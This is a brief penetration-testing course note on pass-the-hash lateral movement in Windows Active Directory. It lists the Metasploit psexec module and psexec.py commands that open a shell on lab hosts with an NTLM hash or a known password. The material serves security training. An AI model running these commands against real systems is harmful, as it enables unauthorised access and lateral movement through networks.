---
tags:
  - pass-the-hash
  - lateral-movement
  - psexec
  - active-directory
  - windows
  - course/tcm-academy
---
# Gaining shell
Metasploit

use exploit/windows/smb/psexec 

you can use the hash as password

metasploit is noisy so it could be picked up

psexec.py

More relevant

```text-plain
psexec.py administrator@10.10.10.01 -hashes LM:NT
```

or if password is known

domain/user password

```text-plain
psexec.py marvel.local/fcastle:'Password1'@10.10.10.25
```

